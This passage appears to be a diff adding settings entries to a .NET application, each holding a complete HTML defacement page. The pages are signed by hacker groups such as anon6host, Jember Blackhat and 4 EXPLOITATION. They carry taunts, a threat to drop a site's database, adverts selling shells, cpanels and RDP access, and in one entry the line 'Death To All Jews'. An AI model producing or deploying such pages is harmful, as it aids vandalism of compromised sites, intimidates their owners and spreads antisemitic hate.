+Dark_Gh0st -&lt;br&gt;./s3nt1n3L - Tatsuy4 - Rep - &lt;b style="text-shadow: 0 0 3px red, 0px 0px 5px red;"&gt;anon6host&lt;/b&gt;&lt;br&gt; &lt;br&gt; &lt;font size="3" color="white" style="text-shadow: 0 0 3px black, 0px 0px 5px black;"&gt;secure it, i will comeback&lt;br&gt;https://anon6host.my.id&lt;br&gt;&lt;br&gt; &lt;/body&gt;&lt;/html&gt; 
+</Value>
+    </Setting>
+    <Setting Name="Setting3" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+?&gt;&lt;head&gt; &lt;title&gt;powned by anon6host&lt;/title&gt; &lt;link rel="icon" type="image/png" href="https://cdn.pbrd.co/images/GrIldsnJ2.png" /&gt; &lt;meta name="og:description" content="hacked by anon6host"/&gt; &lt;meta name="og:image" content="https://cdn.pbrd.co/images/GrIldsnJ2.png"/&gt; &lt;meta name="og:title" content="z3r0-tea."/&gt; &lt;meta charset='utf-8'/&gt; &lt;meta name="robots" content="all"/&gt; &lt;meta name="keyword" content="hacked by anon6host, "/&gt; &lt;meta name="author" content="anon6host."/&gt; &lt;meta name="googlebot" content="auto"/&gt; &lt;meta name="distribution" content="global"/&gt; &lt;script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"&gt;&lt;/script&gt; &lt;link href="http://zonehmirrors.org/defaced/2017/06/15/www.bendigodogtraining.com.au/www.jqueryscript.net/demo/jQuery-Plugin-For-Sakura-Petals-Falling-Animation-Sakura/jquery-sakura.css" rel="stylesheet" type="text/css"&gt; &lt;/head&gt; &lt;audio controls autoplay hidden loop src="https://www.neoanime.co.kr/ost/files/attach/images/446/910/225/008/72938e2141cba646d52fc958a8030856.mp3" type="audio/mpeg"&gt;&lt;/audio&gt; &lt;body&gt; &lt;style&gt; html {cursor:none;background: #000000 100%;background-size: cover;background-attachment: fixed;font-family: Courier New;font-size: 12px;overflow:hidden;} #tlc{font:40px Courier New;font-weight:bold;color:white;position:absolute;left:0;right:0;top:20%;} img {opacity: 0.8;filter: alpha(opacity=50);} img:hover {opacity: 1.0;filter: alpha(opacity=100);} body { -webkit-animation: background 10s cubic-bezier(1,0,0,1) infinite; animation: background 15s cubic-bezier(1,0,0,1) infinite; } img:hover {opacity: 1.0;filter: alpha(opacity=100);} &lt;/style&gt; &lt;script&gt; $(window).load(function () { $('body').sakura(); }); &lt;/script&gt; &lt;!-- start: index --&gt; &lt;/head&gt; &lt;span id='tlc'&gt; &lt;center&gt;&lt;font face="Courier" size="5" color="white" style="text-shadow: 0 0 3px black, 0px 0px 5px black;"&gt;&lt;br&gt;hacked By &lt;b style="text-shadow: 0 0 3px red, 0px 0px 5px red;"&gt;anon6host&lt;/b&gt;&lt;br&gt;&lt;font size="3" color="white" style="text-shadow: 0 0 3px black, 0px 0px 5px black;"&gt;&lt;br&gt;z3r0-team :&lt;br&gt;KosameAmegai - w4nnatry - Rozamyne - N4Y4 -
+Dark_Gh0st -&lt;br&gt;./s3nt1n3L - Tatsuy4 - Rep - &lt;b style="text-shadow: 0 0 3px red, 0px 0px 5px red;"&gt;anon6host&lt;/b&gt;&lt;br&gt; &lt;br&gt; &lt;font size="3" color="white" style="text-shadow: 0 0 3px black, 0px 0px 5px black;"&gt;secure it, i will comeback&lt;br&gt;https://anon6host.my.id&lt;br&gt;&lt;br&gt; &lt;/body&gt;&lt;/html&gt; &lt;!-- end: index --&gt;</Value>
+    </Setting>
+    <Setting Name="Setting4" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+?&gt;&lt;HTML&gt; &lt;head&gt; &lt;title&gt;Hacked by Anon6host&lt;/title&gt; &lt;meta http-equiv="content-type" content="text/html;charset=utf-8" /&gt; &lt;meta name="description" content="without life" /&gt; &lt;meta name="keywords" content="Kanosec" /&gt; &lt;link rel="icon" type="image/jpg" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR4m49Vdf89_SGq7fwMlEZx3IoBOn1YIJ-mUg&amp;usqp=CAU" /&gt; &lt;link rel="preconnect" href="https://fonts.googleapis.com" /&gt; &lt;link rel="preconnect" href="https://fonts.gstatic.com" crossorigin&gt; &lt;link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wght@300&amp;display=swap" rel="stylesheet" /&gt; &lt;link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@1,300&amp;display=swap" rel="stylesheet"&gt; &lt;script type="text/javascript" src="https://zonehmirrors.org/defaced/2020/06/23/ardma.midanuttalim.com/suhunan.sukabumikab.go.id/sakura.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body bgcolor=black onclick="play()"&gt; &lt;div class="content" style="top: 0;left: 0;right: 0;bottom: 0;height: 50%;margin: auto;position: absolute;" /&gt; &lt;center&gt; &lt;img width="560" height="315" src="https://images2.alphacoders.com/128/1286305.jpg" &lt; center&gt;&lt;br /&gt; &lt;font face="Martian Mono:wght" color="white"&gt;&lt;h1&gt;Hacked by &lt;font color="red"&gt;Anon6host&lt;/font&gt;&lt;/h1&gt;&lt;/font&gt;
+&lt;font face="Martian Mono:wght" color="white"&gt;&lt;h1&gt;Jember Blackhat&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;&lt;/font&gt;
+&lt;/br&gt;&lt;/br&gt; &lt;audio id="sec" __idm_id__="823202817"&gt;&lt;source src="https://c.top4top.io/m_2676c8lbd0.mp3" type="audio/mpeg"&gt;&lt;/audio&gt; &lt;/center&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; var x = document.getElementById("sec"); function play() { x.play(); 	 } &lt;/script&gt; &lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Setting5" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!-- Hacked By anon6host --&gt; &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt; &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt; &lt;Meta http-equiv="content-type" content="text/html; charset=windows-1254"&gt; &lt;Meta http-equiv="content-type" content="text/html; charset=ISO-8859-9"&gt; &lt;meta name="keywords" content="hacked" /&gt; &lt;meta name="description" content="anon6host" /&gt; &lt;title&gt;Hacked by Jember Blackhat&lt;/title&gt; &lt;/head&gt; &lt;/br&gt;&lt;/br&gt;&lt;body bgcolor="white"&gt;&lt;table width=100% height=100%&gt;&lt;td align="center"&gt;&lt;font size="4" color="red"&gt;&lt;pre&gt;&lt;/font&gt;&lt;font size="4" color="red"&gt;&lt;pre&gt;&lt;/font&gt;&lt;font size="4" color="RED"&gt;&lt;b&gt;SECURE IT OR I WILL COMEBACK&lt;b&gt;&lt;/font&gt;&lt;br/&gt; &lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW-OfDDkqq0sKUFk3u6t-aF8DamP5A4iqX_Kx_U-ITlPZi92qVNhN-nUYFopUuxLWsli9vlZWADwuSikOOMA-Chw6jAHmooq8r6f0eDUdqMIxAurEHkGnywN7x7UKtBbdOw65aWfswqfIwJWvDfB4tgXTniTo_ubIBT3BqcghAcwPVBegvM7zLmv8U/s16000/20230419_110653.png" height="300"&gt;&lt;/img&gt; &lt;font size="4" color="red"&gt;&lt;pre&gt;&lt;/font&gt;&lt;font size="4" color="black"&gt;Hacked By Jember Blackhat&lt;/font&gt;&lt;br&gt;&lt;br&gt;&lt;font size="4" color="black"&gt;anon6host - Montenk666 - RLX-06&lt;/font&gt;&lt;/font&gt;&lt;/marquee&gt;&lt;/br&gt;&lt;/pre&gt;&lt;/font&gt; &lt;font size="4" color="red"&gt;&lt;pre&gt;&lt;/font&gt;&lt;font size="4" color="black"&gt;https://www.facebook.com/jemberblackhatofficial&lt;/font&gt;&lt;br&gt; &lt;embed src="0" type="audio/mpeg" autostart="true" loop="true" height="0" width="0"&gt;&lt;/div&gt;&lt;/embed&gt; &lt;/html&gt; 
+</Value>
+    </Setting>
+    <Setting Name="Setting6" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+
+&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Hacked By Professor6T9 - Team Anon Force&lt;/title&gt;&lt;meta charset="UTF-8"/&gt;&lt;meta name="author" content="Professor6T9"/&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"/&gt;&lt;meta name="description" content="shells , smtps , mailers , cpanels , exploits available"/&gt;&lt;meta property="og:title" content="Hacked By Professor6T9 - Team Anon Force"/&gt;&lt;meta name="keywords" content="Professor6T9 - Team Anon Force,Hacked By Professor6T9,hacked by Professor6T9,haxor uploader, haxor script deface generator, nathan prinsley, mr.prins, prinsh, hacked by, haxor my id"/&gt;&lt;meta property="og:image" content="https://cdn.prinsh.com/data-1/images/NathanPrinsley-sad-girls-ae.jpg"/&gt;&lt;meta property="og:type" content="website"/&gt; &lt;meta property="og:site_name" content="Haxor Uploader"/&gt;&lt;link rel="shortcut icon" type="image/x-icon" href="https://cdn.prinsh.com/data-1/images/NathanPrinsley-sad-girls-ae.jpg" /&gt;&lt;link rel="stylesheet" type="text/css" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/&gt;&lt;style&gt;body{background: black;font-family:Times New Roman;margin-top:35px;}h1,h2{margin-top:.3em;margin-bottom:.3em;}h1.nprinsleyy{color:#dbd9d9;}h2{color:#dbd9d9;}p.message_prinsley{color:#dbd9d9;margin-top:.25em;margin-bottom:.25em;font-size:17px;font-weight:unset;}.hubungi_prinsh{color:#00eb00;text-decoration:none;}.hubungi_prinsh:hover{color:red}.othermes_nprinsh{color:#00eb00;font-size:14px;}marquee.foonathanPrinsley{display:;position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 20px; color: white; left: 0px; border-top: 2px solid darkred; padding: 5px; background-color: #000}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;center/&gt;&lt;img src="https://cdn.prinsh.com/data-1/images/NathanPrinsley-sad-girls-ae.jpg" style="width: 20%"&gt;&lt;h1 class="nprinsleyy nprinsley-text-glitchan" style="font-size:30px;"&gt;Hacked By Professor6T9&lt;/h1&gt;&lt;h2 style="font-size:30px;" class="nprinsley-text-glitchan"&gt;Team Anon Force&lt;/h2&gt;&lt;p class="message_prinsley nprinsley-text-glitchan"&gt;shells , smtps , mailers , cpanels , exploits available&lt;/p&gt;&lt;p style="font-size:17px;" class="nathan-prinsley_none"&gt;&lt;a class="hubungi_prinsh" href="mailto:teamanonforce@gmail.com"&gt;teamanonforce@gmail.com&lt;/a&gt;&lt;/p&gt;&lt;p class="othermes_nprinsh nathan-prinsley_none"&gt;Telegram:Team Anon Force&lt;/p&gt;&lt;audio src="https://cdn.prinsh.com/data-1/mp3/"  autoplay="1" loop="1"&gt;&lt;/audio&gt;&lt;marquee class="foonathanPrinsley"&gt;&lt;b style="color: #edc800;font-size:16px;" class="nathan-prinsley_none"&gt;Gretings: Mr Unknown6T9 ; R007 K!NG ; And all Hackers &amp; Defacers&lt;/b&gt;&lt;/marquee&gt;&lt;/center&gt;&lt;script src="https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js" type="text/javascript"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Setting7" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+
+&lt;html&gt;&lt;head&gt;
+    &lt;meta property="og:image" content="https://h.top4top.io/p_2630y3z270.jpeg"/&gt;
+    &lt;meta property="og:image:url" content="https://h.top4top.io/p_2630y3z270.jpeg"/&gt;
+    &lt;meta property="og:image:secure_url" content="https://h.top4top.io/p_2630y3z270.jpeg"/&gt;
+    &lt;meta property="og:image:type" content="image/jpeg"&gt;
+    &lt;meta property="og:image:alt" content="H4cked by Awham"&gt;
+    &lt;meta property="og:image:width" content="781"&gt;
+    &lt;meta property="og:image:height" content="439"&gt;
+    &lt;meta property="og:type" content="website"/&gt;
+    &lt;meta property="og:title" content="H4cked by Awham"/&gt;
+    &lt;meta property="og:description" content="Awham was here!"/&gt;
+    &lt;meta name="twitter:card" content="summary_large_image"&gt;
+    &lt;meta name="twitter:site" content="@jj_8t"/&gt;
+    &lt;meta name="twitter:creator" content="@jj_8t"/&gt;
+    &lt;meta name="twitter:title" content="H4cked by Awham"/&gt;
+    &lt;meta name="twitter:description" content="Awham was here!"/&gt; 
+    &lt;meta name="twitter:image" content="https://h.top4top.io/p_2630y3z270.jpeg"/&gt;
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"/&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;meta property="og:site_name" content="H4cked by Awham"&gt;
+    &lt;meta name="HandheldFriendly" content="true"&gt;
+    &lt;link rel="shortcut icon" href="https://h.top4top.io/p_2630y3z270.jpeg" type="image/x-icon"&gt;
+    &lt;meta property="og:image" content="https://h.top4top.io/p_2630y3z270.jpeg"&gt;
+    &lt;link rel="icon" href="https://h.top4top.io/p_2630y3z270.jpeg"&gt;
+    &lt;meta content='H4cked by Awham' name='description'/&gt;
+    &lt;meta content='H4cked by Awham' name='keywords'/&gt;
+    &lt;meta content='H4cked by Awham' name='Abstract'/&gt;
+    &lt;meta name="title" content="H4cked by Awham"&gt;
+    &lt;meta property="og:title" content="H4cked by Awham"&gt;
+    &lt;meta name="twitter:image" content="https://h.top4top.io/p_2630y3z270.jpeg"&gt;
+    &lt;meta property="og:description" content="Awham was here!"/&gt;
+    &lt;meta name="description" content="Awham was here!"&gt;
+    &lt;meta name="keywords" content="H4cked by Awham"&gt;
+    &lt;meta name="googlebot" content="index,follow"/&gt;
+    &lt;meta name="robots" content="all"/&gt;
+    &lt;meta name="robots schedule" content="auto"/&gt;
+    &lt;meta name="distribution" content="global"/&gt;
+    &lt;title&gt;H4cked by Awham&lt;/title&gt;
+    &lt;meta name="robots" content="all"/&gt;&lt;meta name="robots schedule" content="auto"/&gt;
+    &lt;meta contact="#"&gt; &lt;meta charset="utf-8"&gt;
+    &lt;style&gt;
+    html, body {
+        color: #000000;
+        font-family: 'Fredericka the Great', sans-serif;
+        font-weight: 100;
+        height: 100vh;
+        margin: 0;
+    }
+    .full-height {
+        height: 100vh; 
+    } 
+    
+    .flex-center {
+        align-items: center;
+        display: flex;
+        justify-content: center;
+    }
+    .position-ref { 
+        position: relative; 
+    }
+    .content {
+        text-align: center;
+    }
+    .title {
+        font-size: 36px;
+        padding: 20px;
+    }
+    &lt;/style&gt;
+    &lt;style&gt;&lt;/style&gt;&lt;/head&gt;
+    &lt;body align="center" oncontextmenu="return false" bgcolor="FFFFFF"&gt;
+    &lt;div class="stars"&gt;
+    &lt;div class="twinkling"&gt;
+    &lt;div class="flex-center position-ref full-height"&gt;
+    &lt;div class="content"&gt;                                                                                                                  
+    &lt;div class="text"&gt;
+    &lt;font color="#000000"&gt;
+        &lt;img src="https://i.ibb.co/XkxQvKs/00-AC0483-557-E-4-AEF-AA6-B-36004-E590-FBC.jpg" height="200" style="object-fit: scale-down; max-width: 100%; border-radius: 0%;" onclick="location.href = 'https://t.me/jj_8tl';"&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;b&gt;&lt;i&gt;
+        &lt;font size="6" style="text-decoration:none" onclick="location.href = 'https://t.me/jj_8tl';"&gt;&lt;code&gt; Hacked by Awham&lt;/code&gt;&lt;/font&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;code style="text-decoration:none" onclick="location.href = 'https://t.me/jj_8tl';"&gt;It's just that I'm not okay anymore&lt;/code&gt;
+        &lt;/i&gt;&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;font color="#000000"&gt;&lt;b&gt;&lt;i&gt;
+        &lt;br&gt;&lt;code style="text-decoration:none" onclick="location.href = 'https://t.me/jj_8tl';"&gt;Telegram: @jj_8t&lt;/code&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;/i&gt;&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;font color="#FFFFFF"&gt;&lt;b&gt;&lt;i&gt;
+        &lt;/i&gt;&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;font color="#FFFFFF"&gt;
+    &lt;script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vaafb692b2aea4879b33c060e79fe94621666317369993" integrity="sha512-0ahDYl866UMhKuYcW078ScMalXqtFJggm7TmlUtp0UlD4eQk0Ixfnm5ykXKvGJNFjLMoortdseTfsRT8oCfgGA==" data-cf-beacon="{&amp;quot;rayId&amp;quot;:&amp;quot;79a23b9258db1d65&amp;quot;,&amp;quot;version&amp;quot;:&amp;quot;2023.2.0&amp;quot;,&amp;quot;r&amp;quot;:1,&amp;quot;token&amp;quot;:&amp;quot;af76a0f2ef2c4842bd3334f3c2936a9f&amp;quot;,&amp;quot;si&amp;quot;:100}" crossorigin="anonymous"&gt;&lt;/script&gt;
+    
+    &lt;/font&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="imageDownloaderSidebarContainer"&gt;&lt;div class="image-downloader-ext-container"&gt;&lt;div tabindex="-1" class="b-sidebar-outer"&gt;&lt;!----&gt;&lt;div id="image-downloader-sidebar" tabindex="-1" role="dialog" aria-modal="false" aria-hidden="true" class="b-sidebar shadow b-sidebar-right bg-light text-dark" style="width: 500px; display: none;"&gt;&lt;!----&gt;&lt;div class="b-sidebar-body"&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;!----&gt;&lt;/div&gt;&lt;!----&gt;&lt;!----&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+</Value>
+    </Setting>
+    <Setting Name="Setting8" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Hacked?!&lt;/title&gt;
+&lt;/head&gt;
+&lt;style&gt;
+body {
+		background-color: black;
+}
+h1{
+	color: #149414 ;
+	font-size: 2em;
+	text-shadow: 
+	5px 0px 5px #149414, 
+	-4px 0px 4px #149414;
+	font-family: Courier;
+}
+h2 {
+	color: red;
+	font-family: Courier;
+}
+
+&lt;/style&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;img src="https://c.tenor.com/m1Mr-khUDVgAAAAC/anime-hacking.gif"&gt;&lt;br&gt;
+&lt;h1&gt;Pwnd By Luxe&lt;/h1&gt;
+&lt;br&gt;
+&lt;h2&gt;i sell tools : shell , cpanels , rdp , bot get shel fast, contact me : t.me/xk0wk&lt;/h2&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Setting9" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!-- Script by: Mr.JenSkins--&gt; &lt;html&gt; &lt;head&gt;&lt;title&gt;Mr.Jenskins Was Here!!! &lt;/title&gt;&lt;script&gt;alert ('Mr.JenSkins Was Here!!!')&lt;/script&gt;&lt;/meta&gt;&lt;center&gt;&lt;a href="https://ibb.co/dkfdLzX"&gt;&lt;img src="https://i.ibb.co/r5QCc1q/IMG-20191117-WA0096.jpg" alt="IMG-20191117-WA0096"&gt;&lt;/a&gt;&lt;/title&gt;&lt;meta property="og:description"content="Hacked? New"/&gt; &lt;link href="https://fonts.googleapis.com/css?family=Iceberg:400,700" rel="stylesheet" type="text/css"&gt; &lt;style type="text/css"&gt; * { margin:0; padding:0; } body { background-color: #000000; font-family: 'Iceberg'; } .image { background-image: linear-gradient(90deg, #000000 0%, #000000 49%, #000000 100%); position: relative; padding: 3px; display: inline-block; border-radius: 7px; span { display: inline-block; background: #696969; color: white; text-transform: uppercase; padding: 2rem 5rem; border-radius: 5px; } &lt;/style&gt; &lt;/head&gt; &lt;center&gt; &lt;br&gt; &lt;div style="text-shadow: 3px 3px 5px #DC143C;"&gt; &lt;font color="blue" size="7"&gt;MR.Jenskins&lt;/font&gt; &lt;br&gt; &lt;font color="blue" size="3"&gt;Sorry Admin,Your System Has Been Hacked!!!!&lt;/font&gt; &lt;br&gt; &lt;font color="red" size="4"&gt;Special Thanks to:&lt;/font&gt; &lt;br&gt; &lt;font color="purple" size="4"&gt;My Master:King JenSkins and Muslim Cyber Army&lt;/font&gt; &lt;br&gt; &lt;font color="red" size="4"&gt;Thanks to : &lt;br&gt; &lt;font color="blue" size="4"&gt;Muslim Cyber Army and Ancient Cyber Youth Team&lt;/font&gt; &lt;br&gt; &lt;br&gt; &lt;marquee behavior="alternate"&gt; &lt;font color="yellow" size="6"&gt;IM ANONYMOUS &lt;/marquee&gt; &lt;br&gt; &lt;br&gt; &lt;audio autoplay="autoplay" controls="controls" width="128px" height="30px"&gt;&lt;source src="https://f.top4top.io/m_1474eu47u0.mp3" type="audio/mpeg"&gt;&lt;/audio&gt;&lt;br&gt;&lt;br&gt; &lt;marquee behavior="alternate" scrollamount="50" width="500"&gt; &lt;font size="4" color="red"&gt;________________&lt;font size="4" color="yellow"&gt;________________&lt;font size="4" color="#1CFF00"&gt;________________&lt;font size="4" color="#00A7FF"&gt;________________&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/marquee&gt; &lt;/div&gt; &lt;/center&gt; &lt;/html&gt; &lt;style&gt;body { background-image: url(https://i.pinimg.com/originals/f4/52/a2/f452a2f4b634b3011e065da8eaf0a5c3.gif)</Value>
+    </Setting>
+    <Setting Name="Setting10" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta name="title" content="Pwned By 4-Exploitation"&gt;
+    &lt;meta name="description" content="Your Security Just Fucked Up"&gt;
+    &lt;meta name="keywords" content="4 EXPLOITATION"&gt;
+    &lt;meta name="image" content="https://i.pinimg.com/736x/00/09/13/0009138ea3083104ae2d16dcae349dac.jpg"&gt;
+    &lt;meta name="googlebot" content="index,follow"&gt;
+    &lt;meta name="robots" content="index, follow"&gt;
+    &lt;meta name="robots schedule" content="auto"&gt;
+    &lt;meta name="distribution" content="global"&gt;
+    &lt;link rel="icon" type="image/x-icon" href="https://i.pinimg.com/736x/00/09/13/0009138ea3083104ae2d16dcae349dac.jpg"&gt;
+    &lt;link href='https://fonts.googleapis.com/css?family=Sedgwick+Ave' rel='stylesheet'&gt;
+    &lt;script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;title&gt;Pwned By 4-Exploitation&lt;/title&gt;
+    &lt;style&gt;
+      body {
+        background-image:url('https://i.pinimg.com/originals/e5/11/9d/e5119daed0907af196e28b84f124b86e.gif');
+        background-repeat: no-repeat;
+        background-size: cover;
+      }
+      ye {
+        font-family: Tangerine, Cursive;
+        color: #FF0900;
+      }
+      #wrapper {
+        text-align: center;
+      }
+      a { 
+        color: red; 
+      }
+      g {
+        color: green;
+      }
+    &lt;/style&gt;
+    &lt;div id="wrapper"&gt;
+      &lt;img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/ae447fdd-fc93-45cc-9836-f5c41b715c79/d5asbec-60c1c472-d574-467e-a4d9-e3de0e0d4893.gif" height="225px"&gt;
+      &lt;br&gt;
+      &lt;br&gt;
+      &lt;b&gt;
+      &lt;font face="courier" color="#FFFFFF"&gt;
+        This Site Has Been Pwned By &lt;a&gt;4-Exploitation.&lt;/a&gt; 24 Hours Given To Patch This Site Or Else DataBase Will Be Drop &lt;br&gt; Have A Nice Day &lt;br&gt; Goodbye 
+      &lt;br&gt;
+      &lt;br&gt;
+        Greetz : &lt;br&gt; {} &lt;g&gt;D$nny&lt;/g&gt; {} &lt;g&gt;Roti Encem&lt;/g&gt; {} &lt;g&gt;Dr4zaxx&lt;/g&gt; {} &lt;g&gt;LapanWasTaken&lt;/g&gt; {}
+      &lt;br&gt;
+      &lt;br&gt;
+        Laughing At Your Security Since &lt;br&gt;&lt;ye&gt;2k19&lt;/ye&gt;
+      &lt;br&gt;
+      &lt;br&gt;
+        -- Tap Background For Music --
+      &lt;/font&gt;
+      &lt;script&gt;
+ 	
+ function playSound(){var audio=document.querySelector("audio")
+ audio.play()}
+ 
+ &lt;/script&gt;
+
+&lt;body onclick="playSound()" onemouseover="playSound()"&gt;
+  &lt;div class="bg"&gt;
+   
+&lt;audio src="https://d.top4top.io/m_2194jj1gt1.mp3" type="audio/mp3"&gt;&lt;/audio&gt;
+
+&lt;/script&gt;
+      &lt;/body&gt;
+      &lt;/b&gt;
+    &lt;/div&gt;
+    &lt;/head&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Setting11" Type="System.String" Scope="User">
+      <Value Profile="(Default)">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta name="title" content="Hacked By 4 EXPLOITATION"&gt;
+    &lt;meta name="description" content="Security System Is Fucked Up"&gt;
+    &lt;meta name="keywords" content="4 EXPLOITATION"&gt;
+    &lt;meta name="image" content="https://i.ibb.co/LZTTJVt/photo-2023-03-07-17-47-46.jpg"&gt;
+    &lt;link rel="icon" type="image/x-icon" href="https://i.ibb.co/LZTTJVt/photo-2023-03-07-17-47-46.jpg"&gt;
+    &lt;meta name="googlebot" content="index,follow"&gt;
+    &lt;meta name="robots" content="index, follow"&gt;
+    &lt;meta name="robots schedule" content="auto"&gt;
+    &lt;meta name="distribution" content="global"&gt;
+    &lt;iframe src="https://k.top4top.io/m_2156ex9e51.mp3" allow="autoplay" style="display:none;" id="iframeAudio"&gt;&lt;/iframe&gt;
+    &lt;title&gt;Hacked By 4 EXPLOITATION&lt;/title&gt;
+   &lt;script&gt;
+ var source = "https://k.top4top.io/m_2156ex9e51.mp3"
+ var audio = document.createElement("audio");
+ //
+ audio.autoplay = true;
+ //
+ audio.load()
+ audio.addEventListener("load", function() { 
+     audio.play(); 
+ }, true);
+ audio.src = source;
+    &lt;/script&gt;
+  &lt;style&gt;
+    html, body {
+      background-color: #FFFFFF;
+      height: 100vh;
+      margin: 0;
+    }
+    .full-height {
+      height: 100vh;
+    }
+    .flex-center {
+      align-items: center;
+      display: flex;
+      justify-content: center;
+    }
+    .position-ref {
+      position: relative;
+    }
+    .content {
+      text-align: center;
+    }
+    .title {
+      font-size: 36px;
+      padding: 20px;
+    }
+    h {
+      color:#FF0000 ;
+    }
+    g {
+      color: green;
+    }
+  &lt;/style&gt;
+  &lt;body align="center" oncontextmenu="return false" onclick="play()"&gt;
+    &lt;div class="flex-center position-ref full-height"&gt;
+      &lt;div class="content"&gt;
+        &lt;div class="text"&gt;
+          &lt;img src="https://s1.bukalapak.com/img/66962014891/large/Bendera_Tauhid_Panji_Islam_Model_Hitam_Putih.png" height="225px"&gt;
+          &lt;!--&lt;img src="http://www.animated-gifs.fr/category_sports/sports-olympics-flags-boys/0112.gif" width="225px"&gt;--&gt;
+          &lt;br&gt;
+          &lt;font face="courier new" color="black"&gt;
+            &lt;b&gt;
+              Hacked By &lt;h&gt;4 EXPLOITATION&lt;/h&gt;
+            &lt;br&gt;
+            &lt;br&gt;
+              We Are Ummah Hacker , We Are The Sound Of Palestine and We Will Not Remain Silent ! 
+         &lt;br&gt; We Didn't Sleep When You Start Killing Innocent Children And Family , We Didn't Sleep When You Start Destroy Their House And Residence 
+         &lt;br&gt; Death To All Jews
+         &lt;br&gt; We Stand With Palestine And Remember Our Name
+         &lt;br&gt; &lt;h&gt;#OpIsrael&lt;/h&gt; Engaged !!
+            &lt;br&gt;
+            &lt;br&gt;
+              Thanks To : &lt;br&gt; {} &lt;g&gt;D$nny&lt;/g&gt; {} &lt;g&gt;Dr4zaxx&lt;/g&gt; {} &lt;g&gt;Roti Encem&lt;/g&gt; {} &lt;g&gt;LapanWasTaken&lt;/g&gt;  
+            &lt;/b&gt;
+          &lt;/font&gt;
+        &lt;/div&gt;
+     &lt;/body&gt;
+  &lt;/head&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Setting12" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+
+
+
+
+ &lt;title&gt;Hacked By Yuzuri Desu&lt;/title&gt; &lt;meta property="og:title" content="Hacked By Yuzuri Desu"&gt; &lt;meta name="description" content="Otaku Defacer A.k.a"&gt; &lt;meta property="og:description" content="Otaku Defacer A.k.a"&gt;  &lt;meta name="googlebot" content="index,follow" /&gt; &lt;meta name="robots" content="all" /&gt; &lt;meta name="robots schedule" content="auto" /&gt; &lt;meta name="distribution" content="global" /&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;/head&gt; &lt;style&gt; @import url('http://fonts.googleapis.com/css?family=Architects Daughter|Teko|Bubblegum Sans|Patrick Hand'); &lt;/style&gt; &lt;body&gt; 	&lt;body bgcolor="white"&gt; 		&lt;table width=100% height=100%&gt;&lt;td align=center&gt; 		 		&lt;font face="Bubblegum Sans" size="6" color="red"&gt;&lt;b&gt;\!/ Hacked By&lt;font color="black"&gt; Yuzuri Desu \!/&lt;/div&gt;&lt;/font&gt;&lt;/br&gt; 		&lt;center&gt;
+&lt;video width="600" src="https://kosred.com/a/mfexmh.mp4" controls&gt;
+&lt;/video&gt;
